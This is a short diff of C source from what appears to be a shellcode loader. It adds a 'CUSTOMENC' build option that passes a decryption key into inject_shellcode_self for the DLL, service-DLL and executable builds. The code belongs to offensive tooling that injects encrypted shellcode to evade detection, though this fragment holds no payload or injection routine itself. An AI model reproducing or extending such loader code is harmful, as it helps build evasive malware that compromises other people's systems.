@@ -66,9 +66,17 @@ int _main(int argc, char** argv) {
     #endif
     HANDLE hThread = (HANDLE)-1;
     #if defined(SHAREDOBJECT) || defined(SERVICE_DLL)
-        LPVOID allocation = inject_shellcode_self(buf, buf_size, &hThread, FALSE, sleep_time);
+    	#if CUSTOMENC
+        	LPVOID allocation = inject_shellcode_self(buf, buf_size, key, key_size, &hThread, FALSE, sleep_time);
+        #else
+        	LPVOID allocation = inject_shellcode_self(buf, buf_size, &hThread, FALSE, sleep_time);
+        #endif
     #else
-        LPVOID allocation = inject_shellcode_self(buf, buf_size, &hThread, TRUE, sleep_time);
+		#if CUSTOMENC
+		    	LPVOID allocation = inject_shellcode_self(buf, buf_size, key, key_size, &hThread, TRUE, sleep_time);
+		#else
+        	LPVOID allocation = inject_shellcode_self(buf, buf_size, &hThread, TRUE, sleep_time);
+        #endif
     #endif
     if (!allocation || hThread == (HANDLE)-1) {
         #ifdef _DEBUG_
